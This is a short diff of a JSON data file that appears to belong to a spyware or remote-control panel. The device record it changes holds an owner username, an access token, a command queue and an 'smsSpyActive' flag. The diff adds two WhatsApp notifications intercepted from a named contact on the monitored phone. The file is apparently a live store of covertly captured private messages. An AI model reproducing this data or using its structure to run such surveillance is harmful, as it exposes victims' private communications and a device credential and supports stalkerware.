@@ -3031,7 +3031,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "cf99cabf9358fc617b7c22cc76eb4cb3",
-    "lastSeen": 1776745167285,
+    "lastSeen": 1776745171689,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-20T19:20:24.863Z",
@@ -3088,6 +3088,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Ara na Zakiii💕🫶💖💌💋",
+        "content": "‎2 pesan baru",
+        "time": "21/04 11:19",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776745172093
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Ara na Zakiii💕🫶💖💌💋",
+        "content": "‎2 pesan baru",
+        "time": "21/04 11:19",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776745170994
+      },
       {
         "appName": "WhatsApp",
         "sender": "Ara na Zakiii💕🫶💖💌💋",
